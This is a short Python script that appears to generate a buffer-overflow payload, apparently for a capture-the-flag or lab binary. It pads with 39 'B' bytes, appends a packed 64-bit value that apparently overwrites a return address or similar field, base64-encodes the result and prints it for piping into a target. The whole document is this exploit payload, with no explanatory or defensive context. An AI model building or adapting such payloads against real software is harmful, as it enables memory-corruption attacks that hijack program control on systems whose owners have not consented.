
import sys
import struct
import base64

buf = b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
buf += struct.pack('<Q', 16710652630543372448)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
